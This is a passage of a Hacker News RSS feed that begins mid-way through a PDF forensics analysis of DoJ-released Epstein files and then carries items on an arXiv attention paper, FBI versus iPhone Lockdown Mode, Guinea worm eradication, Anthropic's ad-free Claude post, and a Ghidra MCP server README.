<p><span>EFTA00003212.pdf appears to be a redacted image or an error from the DoJ workflow, as it is a single page with the text “No Images Produced”.</span></p>
<p><span>Simple searching of the standardized PDF document information dictionary entries gives the following (note that the technique used will not locate information in compressed object streams, as mentioned above):</span></p>
<table>
<tbody>
<tr>
<td><strong>Key name</strong></td>
<td><strong>Number of PDFs (max. = 4,085)</strong></td>
<td><strong>Comment</strong></td>
</tr>
<tr>
<td><strong>Info</strong></td>
<td>3,823</td>
<td>Some PDFs have empty <strong>Info</strong> dictionaries with no entries</td>
</tr>
<tr>
<td><strong>Title</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Author</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Subject</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Keywords</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Creator</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>Producer</strong></td>
<td>215</td>
<td>Always “pypdf” (denotes <a href="https://pypi.org/project/pypdf/" target="_blank" rel="noopener">https://pypi.org/project/pypdf/</a>)</td>
</tr>
<tr>
<td><strong>CreationDate</strong></td>
<td>3,609</td>
<td>Same PDFs that have <strong>ModDate</strong> with an identical value</td>
</tr>
<tr>
<td><strong>ModDate</strong></td>
<td>3,609</td>
<td>Same PDFs that have <strong>CreationDate</strong> with an identical value</td>
</tr>
<tr>
<td><strong>Trapped</strong></td>
<td>1</td>
<td>Only EFTA00003212.pdf</td>
</tr>
<tr>
<td><strong>APPL:Keywords</strong></td>
<td>0</td>
<td></td>
</tr>
</tbody>
</table>

<h3 id="date-analysis">Date analysis</h3>
<p>Detailed date analysis is a common task in the forensic analysis of potentially fraudulent or modified documents. However, in the case of redacted or sanitized documents, where the document is known to have been modified, this can be less useful.</p>
<p>The creation and modification dates for the 3,609 PDFs range from December 18, 2025, 14:32:05 (2:32 pm) to December 19, 2025, 23:26:13 (almost midnight). For all files, the creation and modification dates are always the same. This may also imply that the DoJ batch processing to prepare this tranche of PDFs took at least 36 hours!</p>
<p>What’s also interesting is that the <strong>CreationDate</strong> and <strong>ModDate</strong> fields in the hidden document information dictionary (inside the object stream of the first increment update – see above) appear to always be an exact match to both the <strong>CreationDate</strong> and <strong>ModDate</strong> of the original document. This implies that all dates across all incremental updates were updated in a single processing pass that applied the Bates numbering.</p>
<h2 id="photographs">Photographs</h2>
<p>There are no JPEG images (<strong>DCTDecode </strong>filter) in any PDF in the tranche, including the full-page photographs. Randomly viewing the photographic images at high magnification (zoom) in PDF viewers clearly shows JPEG “jaggy” <a href="https://en.wikipedia.org/wiki/Compression_artifact" target="_blank" rel="noopener">compression artifacts</a>. All photographic images appear to have been downscaled to 96 DPI (769 x 1152 or 1152 x 769 pixels), making text on random objects in the photos much harder to discern (see the <a href="#ocr">OCR discussion below</a>).</p>
<p>DoJ explicitly avoids JPEG images in the PDFs probably because they appreciate that JPEGs often contain identifiable information, such as EXIF, IPTC, or XMP metadata, as well as <a href="https://exiftool.org/#JPEG" target="_blank" rel="noopener">COM (comment) tags</a> in the JPEG bitstream. This information may disclose the camera model and serial number, GPS location, camera operator details, date/time of the photo, etc., and is more difficult to redact while retaining the JPEG data. The DoJ processing pipeline has therefore explicitly converted all lossy JPEG images to low DPI, FLATE-encoded bitmaps in the PDFs using an indexed device-dependent color space with a palette of 256 unique colors (which reduces the color fidelity compared to the original high-quality digital color photograph).</p>
<h2 id="scanned-documents-or-are-they">Scanned documents – or are they?</h2>
<p>Randomly inspecting the tranche discovers many documents that appear to have been created by a scanning process. On closer inspection, there are documents that have tell-tale artifacts from a physical scanning process, such as visible physical paper edges, punched holes, staple marks, spiral binding, stamps, paper scuff marks, color blotches and inconsistencies, handwritten notes or marginalia, varying paper skew, and platen marks from the physical paper scanning processes. For example, VOL00007\IMAGES\0001\EFTA00009440.pdf shows many of these aspects</p>
<p>There are also other documents that appear to <span><em>simulate</em></span> a scanned document but completely lack the “real-world noise” expected with physical paper-based workflows. The much crisper images appear almost perfect without random artifacts or background noise, and with the exact same amount of image skew across multiple pages. Thanks to the borders around each page of text, page skew can easily be measured, such as with VOL00007\IMAGES\0001\EFTA00009229.pdf. It is highly likely these PDFs were created by rendering original content (from a digital document) to an image (e.g., via print to image or save to image functionality) and then applying image processing such as skew, downscaling, and color reduction.</p>
<p>The use of the timeless monospaced (also known as fixed-width) “Courier” typeface means that the number of characters redacted can be easily determined by vertical alignment with text lines above and below each redaction. In some instances, this may reduce the possible number of options that represent the redacted content, allowing it to be more easily guessed. Although redaction of variable-width typefaces is far more complex, Bland, M., Iyer, A., and Levchenko, K. 2022 paper “<a href="http://arxiv.org/abs/2206.02285" target="_blank" rel="noopener">Story Beyond the Eye: Glyph Positions Break PDF Text Redaction</a>” showed that this is still possible with sufficient computing power and determination.</p>
<h3 id="optical-character-recognition-ocr"><a id="ocr"></a>Optical Character Recognition (OCR)</h3>
<p><a href="https://en.wikipedia.org/wiki/Optical_character_recognition" target="_blank" rel="noopener">OCR</a> is complex image processing that attempts to identify text in bitmap images. In PDF files, OCR-identified text is commonly placed on top of the image using the invisible text render mode. This enables users to then extract the text from the image.</p>
<p>Returning to the very first PDF file in the tranche, VOL00001\IMAGES\0001\EFTA00000001.pdf - this is a full-page photo of a hand-written sign where part of the hand-written information is explicitly redacted. The PDF contains largely inaccurate OCR-ed text, indicating that natural language processing (NLP), machine learning (ML), or even language aware dictionary-based algorithms were not used. This means that there will be more errors in the extracted text than is necessary.</p>
<p>With cloud platforms readily accessible and supporting advanced OCR at low cost, anyone is capable of re-processing the entire tranche of PDFs and comparing the OCR results to those provided by DoJ. Even though the page images are low-resolution (96 DPI), rerunning OCR may bring to light additional or corrected information hidden by the original OCR that failed to recognize everything correctly.</p>
<p>The “black box” redactions we investigated were all correctly applied directly into the image pixel data. They are not separate PDF rectangle objects simply floating above sensitive information that was still present in the image and easily discoverable. Yes, sometimes it is that easy…!</p>
<h2 id="conclusion">Conclusion</h2>
<p>We did not set out to comprehensively analyze every corner of every PDF file in the Epstein PDFs, but to present a basic walk-through of some of the challenges and tricks used to conduct a PDF forensic assessment. Our results above were from a small random sample of documents - there may well be outlier PDFs in the data sets that we did not encounter.</p>
<p>The DoJ has clearly created internal processes, systems, and workflows that can sanitize and redact information prior to publishing as PDF. This includes converting JPEG images to low-resolution pixel-only bitmaps, largely removing metadata, and rendering page images to bitmaps. OCR appears to have been widely applied, but is of variable quality.</p>
<p>Their PDF technology could be improved to vastly reduce file size by removing unnecessary objects (e.g., empty content streams, ProcSets, empty thumbnail references, etc.), simplifying and reducing content streams, applying all incremental updates (i.e., removing all incremental update sections), and always using compressed object streams and compressed cross-reference streams. Information leakage may also be occurring via PDF comments or orphaned objects inside compressed object streams, as I discovered above.</p>
<p>PDF forensics is a highly complex field, where variations in files and tool assumptions can easily yield false results. The PDF Association hosts a PDF Forensic Liaison Working Group to develop industry guidance on forensic examination of PDF files and to educate document examiners and other specialists about many of these aspects.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Attention at Constant Cost per Token via Symmetry-Aware Taylor Approximation (126 pts)]]></title>
            <link>https://arxiv.org/abs/2602.00294</link>
            <guid>46886265</guid>
            <pubDate>Wed, 04 Feb 2026 14:33:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2602.00294">https://arxiv.org/abs/2602.00294</a>, See on <a href="https://news.ycombinator.com/item?id=46886265">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2602.00294">View PDF</a>
    <a href="https://arxiv.org/html/2602.00294v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>The most widely used artificial intelligence (AI) models today are Transformers employing self-attention. In its standard form, self-attention incurs costs that increase with context length, driving demand for storage, compute, and energy that is now outstripping society's ability to provide them. To help address this issue, we show that self-attention is efficiently computable to arbitrary precision with constant cost per token, achieving orders-of-magnitude reductions in memory use and computation. We derive our formulation by decomposing the conventional formulation's Taylor expansion into expressions over symmetric chains of tensor products. We exploit their symmetry to obtain feed-forward transformations that efficiently map queries and keys to coordinates in a minimal polynomial-kernel feature basis. Notably, cost is fixed inversely in proportion to head size, enabling application over a greater number of heads per token than otherwise feasible. We implement our formulation and empirically validate its correctness. Our work enables unbounded token generation at modest fixed cost, substantially reducing the infrastructure and energy demands of large-scale Transformer models. The mathematical techniques we introduce are of independent interest.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Leo Kozachkov [<a href="https://arxiv.org/show-email/aad7e88e/2602.00294" rel="nofollow">view email</a>]      <br>    <strong>[v1]</strong>
        Fri, 30 Jan 2026 20:38:02 UTC (2,756 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FBI couldn't get into WaPo reporter's iPhone because Lockdown Mode enabled (482 pts)]]></title>
            <link>https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/</link>
            <guid>46886237</guid>
            <pubDate>Wed, 04 Feb 2026 14:31:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/">https://www.404media.co/fbi-couldnt-get-into-wapo-reporters-iphone-because-it-had-lockdown-mode-enabled/</a>, See on <a href="https://news.ycombinator.com/item?id=46886237">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
<!--kg-card-begin: html-->

<!--kg-card-end: html-->
<p>The FBI has been unable to access a Washington Post reporter’s seized iPhone because it was in Lockdown Mode, a sometimes overlooked feature that makes iPhones broadly more secure, according to recently filed court records.</p><p>The court record shows what devices and data the FBI was able to ultimately access, and which devices it could not, after <a href="https://www.theguardian.com/us-news/2026/jan/14/fbi-raid-washington-post-hannah-natanson?ref=404media.co"><u>raiding the home of the reporter</u></a>, Hannah Natanson, in January as part of an investigation into leaks of classified information. It also provides rare insight into the apparent effectiveness of Lockdown Mode, or at least how effective it might be before the FBI may try other techniques to access the device.</p><div><p>💡</p><p><b><strong>Do you know anything else about phone unlocking technology? I would love to hear from you. Using a non-work device, you can message me securely on Signal at joseph.404 or send me an email at joseph@404media.co.</strong></b></p></div>
</div><div>
  <div>
    <h2>This post is for paid members only</h2>
    <p>Become a paid member for unlimited ad-free access to articles, bonus podcast content, and more.</p>
    <p><a href="https://www.404media.co/membership/">Subscribe</a>
  </p></div>
  <div>
    <h2>Sign up for free access to this post</h2>
    <p>Free members get access to posts like this one along with an email round-up of our week's stories.</p>
    <p><a href="https://www.404media.co/signup/">Subscribe</a>
  </p></div>
  <p>Already have an account? <a href="https://www.404media.co/signin/" data-portal="signin">Sign in</a></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Guinea worm on track to be 2nd eradicated human disease; only 10 cases in 2025 (182 pts)]]></title>
            <link>https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/</link>
            <guid>46886191</guid>
            <pubDate>Wed, 04 Feb 2026 14:27:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/">https://arstechnica.com/health/2026/02/guinea-worm-on-track-to-be-2nd-eradicated-human-disease-only-10-cases-in-2025/</a>, See on <a href="https://news.ycombinator.com/item?id=46886191">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                      
                      
          <p>A debilitating infection from the parasitic Guinea worm is inching closer to global eradication, with an all-time low of only 10 human cases reported worldwide in 2025, <a href="https://www.cartercenter.org/news/guinea-worm-announcement/">the Carter Center announced</a>.</p>
<p>If health workers can fully wipe out the worms, it will be only the second human disease to be eradicated, after smallpox.</p>
<p>Guinea worm (<em>Dracunculus medinensis</em>) is a parasitic nematode transmitted in water. More specifically, it’s found in waters that contain small crustacean copepods, which harbor the worm’s larvae. If a person consumes water contaminated with Guinea worm, the parasites burrow through the intestinal tract and migrate through the body. About a year later, a spaghetti noodle-length worm emerges from a painful blister, usually in the feet or legs. It can take up to eight weeks for the adult worm to fully emerge. To ease the searing pain, infected people may put their blistered limbs in water, allowing the parasite to release more larvae and continue the cycle.</p>
<p>In addition to being extremely painful, the disease (dracunculiasis) can lead to complications, such as secondary infections and sepsis, which in turn can lead to temporary or permanent disability.</p>
<p>When the Guinea worm eradication program began in 1986, there were an estimated 3.5 million cases across 21 countries in Africa and Asia. To date, only six countries have not been certified by the World Health Organization as Guinea worm-free. In 2024, there were just 15 cases, and, according to the provisional tally for 2025, the number is down to just 10. It’s considered provisional until each country’s disease reports are confirmed, which occurs in a program meeting usually held in April.</p>

          
                      
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Claude Is a Space to Think (231 pts)]]></title>
            <link>https://www.anthropic.com/news/claude-is-a-space-to-think</link>
            <guid>46884883</guid>
            <pubDate>Wed, 04 Feb 2026 12:08:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.anthropic.com/news/claude-is-a-space-to-think">https://www.anthropic.com/news/claude-is-a-space-to-think</a>, See on <a href="https://news.ycombinator.com/item?id=46884883">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div data-theme="ivory"><p>There are many good places for advertising. A conversation with Claude is not one of them.</p><p>Advertising drives competition, helps people discover new products, and allows services like email and social media to be offered for free. We’ve run our own <a href="https://www.youtube.com/watch?v=FDNkDBNR7AM">ad campaigns</a>, and our AI models have, in turn, helped many of our customers in the advertising industry.</p><p>But including ads in conversations with Claude would be incompatible with what we want Claude to be: a genuinely helpful assistant for work and for deep thinking.</p><p>We want Claude to act unambiguously in our users’ interests. So we’ve made a choice: Claude will remain ad-free. Our users won’t see “sponsored” links adjacent to their conversations with Claude; nor will Claude’s responses be influenced by advertisers or include third-party product placements our users did not ask for.</p><h2 id="the-nature-of-ai-conversations"><strong>The nature of AI conversations</strong></h2><p>When people use search engines or social media, they’ve come to expect a mixture of organic and sponsored content. Filtering signal from noise is part of the interaction.</p><p>Conversations with AI assistants are meaningfully different. The format is open-ended; users often share context and reveal more than they would in a search query. This openness is part of what makes conversations with AI valuable, but it’s also what makes them susceptible to influence in ways that other digital products are not.</p><p>Our <a href="https://www.anthropic.com/news/how-people-use-claude-for-support-advice-and-companionship">analysis of conversations</a> with Claude (conducted in a way that keeps all data <a href="https://www.anthropic.com/research/clio">private and anonymous</a>) shows that an appreciable portion involve topics that are sensitive or deeply personal—the kinds of conversations you might have with a trusted advisor. Many other uses involve complex software engineering tasks, deep work, or thinking through difficult problems. The appearance of ads in these contexts would feel incongruous—and, in many cases, inappropriate.</p><p>We still have much to learn about the impact of AI models on the people who use them. <a href="https://www.jmir.org/2025/1/e67114">Early</a> <a href="https://hai.stanford.edu/news/exploring-the-dangers-of-ai-in-mental-health-care">research</a> suggests both benefits—like people finding support they couldn’t access elsewhere—and risks, including the potential for models to reinforce harmful beliefs in vulnerable users. Introducing advertising incentives at this stage would add another level of complexity. <a href="https://www.anthropic.com/research/tracing-thoughts-language-model">Our understanding</a> of how models translate the goals we set them into specific behaviors is still developing; an ad-based system could therefore have unpredictable results.</p><h2 id="incentive-structures"><strong>Incentive structures</strong></h2><p>Being genuinely helpful is one of the core principles of <a href="https://www.anthropic.com/constitution">Claude’s Constitution</a>, the document that describes our vision for Claude’s character and guides how we train the model. An advertising-based business model would introduce incentives that could work against this principle.</p><p>Consider a concrete example. A user mentions they’re having trouble sleeping. An assistant without advertising incentives would explore the various potential causes—stress, environment, habits, and so on—based on what might be most insightful to the user. An ad-supported assistant has an additional consideration: whether the conversation presents an opportunity to make a transaction. These objectives may often align—but not always. And, unlike a list of search results, ads that influence a model’s responses may make it difficult to tell whether a given recommendation comes with a commercial motive or not. Users shouldn’t have to second-guess whether an AI is genuinely helping them or subtly steering the conversation towards something monetizable.</p><p>Even ads that don’t directly influence an AI model’s responses and instead appear separately within the chat window would compromise what we want Claude to be: a clear space to think and work. Such ads would also introduce an incentive to optimize for engagement—for the amount of time people spend using Claude and how often they return. These metrics aren’t necessarily aligned with being genuinely helpful. The most useful AI interaction might be a short one, or one that resolves the user’s request without prompting further conversation.</p><p>We recognize that not all advertising implementations are equivalent. More transparent or opt-in approaches—where users explicitly choose to see sponsored content—might avoid some of the concerns outlined above. But the history of ad-supported products suggests that advertising incentives, once introduced, tend to expand over time as they become integrated into revenue targets and product development, blurring boundaries that were once more clear-cut. We’ve chosen not to introduce these dynamics into Claude.</p><h2 id="our-approach"><strong>Our approach</strong></h2><p>Anthropic is focused on businesses, developers, and helping our users flourish. Our business model is straightforward: we generate revenue through enterprise contracts and paid subscriptions, and we reinvest that revenue into improving Claude for our users. This is a choice with tradeoffs, and we respect that other AI companies might reasonably reach different conclusions.</p><p>Expanding access to Claude is central to our public benefit mission, and we want to do it without selling our users’ attention or data to advertisers. To that end, we’ve <a href="https://www.anthropic.com/news/anthropic-teach-for-all">brought AI tools and training to educators</a> in over 60 countries, begun national AI education pilots with <a href="https://www.anthropic.com/news/anthropic-and-iceland-announce-one-of-the-world-s-first-national-ai-education-pilots">multiple</a> <a href="https://www.anthropic.com/news/rwandan-government-partnership-ai-education">governments</a>, and made Claude <a href="https://www.anthropic.com/news/claude-for-nonprofits">available to nonprofits</a> at a significant discount. We continue to invest in our smaller models so that our free offering remains at the frontier of intelligence, and we may consider lower-cost subscription tiers and regional pricing where there is clear demand for it. Should we need to revisit this approach, we’ll be transparent about our reasons for doing so.</p><h2 id="supporting-commerce"><strong>Supporting commerce</strong></h2><p>AI will increasingly interact with commerce, and we look forward to supporting this in ways that help our users. We’re particularly interested in the potential of agentic commerce, where Claude acts on a user’s behalf to handle a purchase or booking end to end. And we’ll continue to build features that enable our users to find, compare, or buy products, connect with businesses, and more—when they choose to do so.</p><p>We’re also exploring more ways to make Claude a focused space to be at your most productive. Users can already <a href="https://claude.com/blog/interactive-tools-in-claude">connect third-party tools</a> they use for work—like Figma, Asana, and Canva—and interact with them directly within Claude. We expect to introduce many more useful integrations and expand this toolkit over time.</p><p>All third-party interactions will be grounded in the same overarching design principle: they should be initiated by the <em>user </em>(where the AI is working for them) rather than an <em>advertiser</em> (where the AI is working, at least in part, for someone else). Today, whether someone asks Claude to research running shoes, compare mortgage rates, or recommend a restaurant for a special occasion, Claude’s only incentive is to give a helpful answer. We’d like to preserve that.</p><h2 id="a-trusted-tool-for-thought"><strong>A trusted tool for thought</strong></h2><p>We want our users to trust Claude to help them keep thinking—about their work, their challenges, and their ideas.</p><p>Our experience of using the internet has made it easy to assume that advertising on the products we use is inevitable. But open a notebook, pick up a well-crafted tool, or stand in front of a clean chalkboard, and there are no ads in sight.</p><p>We think Claude should work the same way.</p></div></article></div><div data-theme="ivory"><p><h2>Related content</h2></p><div><div><h3>Apple’s Xcode now supports the Claude Agent SDK</h3><p><a href="https://www.anthropic.com/news/apple-xcode-claude-agent-sdk" referrerpolicy="no-referrer-when-downgrade"><span>Read more</span><span><svg width="20" height="20" viewBox="0 0 21 21"><path d="M4.14585 9.87492L14.4584 9.87492L9.60419 5.04158L10.5 4.14575L16.8542 10.4999L10.5 16.8541L9.60419 15.9583L14.4584 11.1249L4.14585 11.1249L4.14585 9.87492Z" fill="currentColor"></path></svg></span></a></p></div><div><h3>Anthropic partners with Allen Institute and Howard Hughes Medical Institute to accelerate scientific discovery</h3><p><a href="https://www.anthropic.com/news/anthropic-partners-with-allen-institute-and-howard-hughes-medical-institute" referrerpolicy="no-referrer-when-downgrade"><span>Read more</span><span><svg width="20" height="20" viewBox="0 0 21 21"><path d="M4.14585 9.87492L14.4584 9.87492L9.60419 5.04158L10.5 4.14575L16.8542 10.4999L10.5 16.8541L9.60419 15.9583L14.4584 11.1249L4.14585 11.1249L4.14585 9.87492Z" fill="currentColor"></path></svg></span></a></p></div><div><h3>ServiceNow chooses Claude to power customer apps and increase internal productivity</h3><p><a href="https://www.anthropic.com/news/servicenow-anthropic-claude" referrerpolicy="no-referrer-when-downgrade"><span>Read more</span><span><svg width="20" height="20" viewBox="0 0 21 21"><path d="M4.14585 9.87492L14.4584 9.87492L9.60419 5.04158L10.5 4.14575L16.8542 10.4999L10.5 16.8541L9.60419 15.9583L14.4584 11.1249L4.14585 11.1249L4.14585 9.87492Z" fill="currentColor"></path></svg></span></a></p></div></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Ghidra MCP Server – 110 tools for AI-assisted reverse engineering (243 pts)]]></title>
            <link>https://github.com/bethington/ghidra-mcp</link>
            <guid>46882389</guid>
            <pubDate>Wed, 04 Feb 2026 06:51:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/bethington/ghidra-mcp">https://github.com/bethington/ghidra-mcp</a>, See on <a href="https://news.ycombinator.com/item?id=46882389">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Ghidra MCP Server</h2><a id="user-content-ghidra-mcp-server" aria-label="Permalink: Ghidra MCP Server" href="#ghidra-mcp-server"></a></p>
<p dir="auto"><a href="https://opensource.org/licenses/Apache-2.0" rel="nofollow"><img src="https://camo.githubusercontent.com/a549a7a30bacba7bfceebdc207a8e86c3f2c02995a2527640dca30048fd2b64e/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c6963656e73652d417061636865253230322e302d626c75652e737667" alt="License" data-canonical-src="https://img.shields.io/badge/License-Apache%202.0-blue.svg"></a>
<a href="https://openjdk.java.net/projects/jdk/21/" rel="nofollow"><img src="https://camo.githubusercontent.com/b4a38f2fc33ed2f57cbcfd6988fe6791b914b802842fe66aa164e86cff6534cf/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4a6176612d32312532304c54532d6f72616e67652e737667" alt="Java Version" data-canonical-src="https://img.shields.io/badge/Java-21%20LTS-orange.svg"></a>
<a href="https://ghidra-sre.org/" rel="nofollow"><img src="https://camo.githubusercontent.com/f52e0f0fcd3839839366190b582ccf024b8c0246358764859575923205758940/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4768696472612d31322e302e322d677265656e2e737667" alt="Ghidra Version" data-canonical-src="https://img.shields.io/badge/Ghidra-12.0.2-green.svg"></a>
<a href="https://github.com/bethington/ghidra-mcp/blob/main/CHANGELOG.md"><img src="https://camo.githubusercontent.com/df860fb53ded212171a8bb5287d797865dae05df12f96c283ba44aa14f644a5a/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f56657273696f6e2d322e302e302d627269676874677265656e2e737667" alt="Version" data-canonical-src="https://img.shields.io/badge/Version-2.0.0-brightgreen.svg"></a></p>
<blockquote>
<p dir="auto">If you find this useful, please ⭐ star the repo — it helps others discover it!</p>
</blockquote>
<p dir="auto">A production-ready Model Context Protocol (MCP) server that bridges Ghidra's powerful reverse engineering capabilities with modern AI tools and automation frameworks.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">🌟 Features</h2><a id="user-content--features" aria-label="Permalink: 🌟 Features" href="#-features"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Core MCP Integration</h3><a id="user-content-core-mcp-integration" aria-label="Permalink: Core MCP Integration" href="#core-mcp-integration"></a></p>
<ul dir="auto">
<li><strong>Full MCP Compatibility</strong> - Complete implementation of Model Context Protocol</li>
<li><strong>110 MCP Tools Available</strong> - Comprehensive API surface for binary analysis</li>
<li><strong>Production-Ready Reliability</strong> - Tested batch operations and atomic transactions</li>
<li><strong>Real-time Analysis</strong> - Live integration with Ghidra's analysis engine</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Binary Analysis Capabilities</h3><a id="user-content-binary-analysis-capabilities" aria-label="Permalink: Binary Analysis Capabilities" href="#binary-analysis-capabilities"></a></p>
<ul dir="auto">
<li><strong>Function Analysis</strong> - Decompilation, call graphs, cross-references</li>
<li><strong>Data Structure Discovery</strong> - Automatic struct/union/enum creation</li>
<li><strong>String Extraction</strong> - Comprehensive string analysis and categorization</li>
<li><strong>Import/Export Analysis</strong> - Symbol table and library dependency mapping</li>
<li><strong>Memory Mapping</strong> - Complete memory layout documentation</li>
<li><strong>Cross-Binary Documentation</strong> - Function hash matching across binary versions</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Development &amp; Automation</h3><a id="user-content-development--automation" aria-label="Permalink: Development &amp; Automation" href="#development--automation"></a></p>
<ul dir="auto">
<li><strong>Automated Development Cycle</strong> - Complete build-test-deploy-verify pipeline</li>
<li><strong>Ghidra Script Management</strong> - Create, run, and manage Ghidra scripts via MCP</li>
<li><strong>Multi-Program Support</strong> - Switch between and compare multiple open programs</li>
<li><strong>Batch Operations</strong> - Efficient bulk renaming, commenting, and typing</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Quick Start</h2><a id="user-content--quick-start" aria-label="Permalink: 🚀 Quick Start" href="#-quick-start"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Prerequisites</h3><a id="user-content-prerequisites" aria-label="Permalink: Prerequisites" href="#prerequisites"></a></p>
<ul dir="auto">
<li><strong>Java 21 LTS</strong> (OpenJDK recommended)</li>
<li><strong>Apache Maven 3.9+</strong></li>
<li><strong>Ghidra 12.0.2</strong> (or compatible version)</li>
<li><strong>Python 3.8+</strong> with pip</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Installation</h3><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<ol dir="auto">
<li>
<p dir="auto"><strong>Clone the repository:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/bethington/ghidra-mcp.git
cd ghidra-mcp"><pre>git clone https://github.com/bethington/ghidra-mcp.git
<span>cd</span> ghidra-mcp</pre></div>
</li>
<li>
<p dir="auto"><strong>Install Python dependencies:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install -r requirements.txt"><pre>pip install -r requirements.txt</pre></div>
</li>
<li>
<p dir="auto"><strong>Copy Ghidra libraries</strong> (see <a href="#library-dependencies">Library Dependencies</a> for full list):</p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows - run the provided batch script
copy-ghidra-libs.bat &quot;C:\path\to\ghidra_12.0.2_PUBLIC&quot;

# Linux/Mac - copy manually from your Ghidra installation
# See Library Dependencies section below for all 14 required JARs"><pre><span><span>#</span> Windows - run the provided batch script</span>
copy-ghidra-libs.bat <span><span>"</span>C:\path\to\ghidra_12.0.2_PUBLIC<span>"</span></span>

<span><span>#</span> Linux/Mac - copy manually from your Ghidra installation</span>
<span><span>#</span> See Library Dependencies section below for all 14 required JARs</span></pre></div>
</li>
<li>
<p dir="auto"><strong>Build the plugin:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="mvn clean package assembly:single -DskipTests"><pre>mvn clean package assembly:single -DskipTests</pre></div>
</li>
<li>
<p dir="auto"><strong>Deploy to Ghidra:</strong></p>
<div dir="auto" data-snippet-clipboard-copy-content="# Windows (automated)
.\deploy-to-ghidra.ps1

# Or manually copy to Ghidra Extensions
Copy-Item target\GhidraMCP-2.0.0.zip &quot;C:\ghidra\Extensions\Ghidra\&quot;"><pre><span><span>#</span> Windows (automated)</span>
.<span>\deploy-to</span><span>-</span>ghidra.ps1

<span><span>#</span> Or manually copy to Ghidra Extensions</span>
<span>Copy-Item</span> target\GhidraMCP<span>-</span><span>2.0</span>.<span>0.</span>zip <span><span>"</span>C:\ghidra\Extensions\Ghidra\<span>"</span></span></pre></div>
</li>
</ol>
<p dir="auto"><h3 tabindex="-1" dir="auto">Basic Usage</h3><a id="user-content-basic-usage" aria-label="Permalink: Basic Usage" href="#basic-usage"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Option 1: Stdio Transport (Recommended for AI tools)</h4><a id="user-content-option-1-stdio-transport-recommended-for-ai-tools" aria-label="Permalink: Option 1: Stdio Transport (Recommended for AI tools)" href="#option-1-stdio-transport-recommended-for-ai-tools"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="python bridge_mcp_ghidra.py"><pre>python bridge_mcp_ghidra.py</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">Option 2: SSE Transport (Web/HTTP clients)</h4><a id="user-content-option-2-sse-transport-webhttp-clients" aria-label="Permalink: Option 2: SSE Transport (Web/HTTP clients)" href="#option-2-sse-transport-webhttp-clients"></a></p>
<div dir="auto" data-snippet-clipboard-copy-content="python bridge_mcp_ghidra.py --transport sse --mcp-host 127.0.0.1 --mcp-port 8081"><pre>python bridge_mcp_ghidra.py --transport sse --mcp-host 127.0.0.1 --mcp-port 8081</pre></div>
<p dir="auto"><h4 tabindex="-1" dir="auto">In Ghidra</h4><a id="user-content-in-ghidra" aria-label="Permalink: In Ghidra" href="#in-ghidra"></a></p>
<ol dir="auto">
<li>Start Ghidra and load a binary</li>
<li>Go to <strong>Tools &gt; GhidraMCP &gt; Start MCP Server</strong></li>
<li>The server runs on <code>http://127.0.0.1:8080/</code> by default</li>
</ol>
<p dir="auto"><h2 tabindex="-1" dir="auto">📊 Production Performance</h2><a id="user-content--production-performance" aria-label="Permalink: 📊 Production Performance" href="#-production-performance"></a></p>
<ul dir="auto">
<li><strong>MCP Tools</strong>: 110 tools fully implemented</li>
<li><strong>Speed</strong>: Sub-second response for most operations</li>
<li><strong>Efficiency</strong>: 93% reduction in API calls via batch operations</li>
<li><strong>Reliability</strong>: Atomic transactions with all-or-nothing semantics</li>
<li><strong>Deployment</strong>: Automated version-aware deployment script</li>
</ul>
